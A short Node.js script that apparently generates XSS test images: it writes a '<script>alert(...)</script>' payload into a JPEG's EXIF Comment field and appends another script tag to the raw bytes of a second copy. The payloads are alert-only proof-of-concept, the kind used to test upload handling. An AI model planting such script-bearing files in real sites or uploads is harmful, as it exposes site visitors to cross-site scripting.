const { ExifTool } = require('exiftool-vendored');
const fs = require('fs');
const path = require('path');

const exiftool = new ExifTool();

async function embedXSS() {
  const source = '40010.jpg';
  const target = 'xss-40010.jpg';

  fs.copyFileSync(source, target);

  await exiftool.write(target, {
    Comment: '<script>alert("XSS from EXIF!")</script>',
  });

  console.log('✅ XSS payload added to EXIF metadata.');
  exiftool.end();
}

function appendScript() {

  const originalImage = '40010.jpg'; // use a real JPEG image
  const maliciousImage = 'xss-40010-appended.jpg';

  // Your fake script payload
  const script = '\n<script>alert("XSS inside image")</script>\n';

  const imageData = fs.readFileSync(originalImage);
  const scriptBuffer = Buffer.from(script, 'utf8');

  // Combine image + script
  const finalBuffer = Buffer.concat([imageData, scriptBuffer]);

  fs.writeFileSync(maliciousImage, finalBuffer);
  console.log('✅ Created image with embedded script content.');
}

appendScript();

embedXSS();